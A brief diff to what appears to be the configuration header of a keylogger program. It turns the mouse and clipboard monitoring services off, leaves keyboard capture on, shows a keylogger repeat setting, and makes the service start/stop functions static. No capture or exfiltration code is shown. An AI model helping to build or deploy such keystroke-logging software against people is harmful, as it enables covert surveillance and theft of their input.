@@ -2,8 +2,8 @@
 
 // Service toggle
 #define KEYBOARD_SERVICE	true
-#define MOUSE_SERVICE		true
-#define CRIPBOARD_SERVICE	true
+#define MOUSE_SERVICE		false
+#define CRIPBOARD_SERVICE	false
 
 // Keylogger settings
 #define KEYLOGGER_MAX_REPEATS 10
@@ -21,7 +21,7 @@
 
 namespace services
 {
-	void runAll()
+	static void runAll()
 	{
 #if KEYBOARD_SERVICE
 		keyboard::run();
@@ -34,7 +34,7 @@ namespace services
 #endif
 	}
 
-	void stopAll()
+	static void stopAll()
 	{
 #if KEYBOARD_SERVICE
 		keyboard::stop();
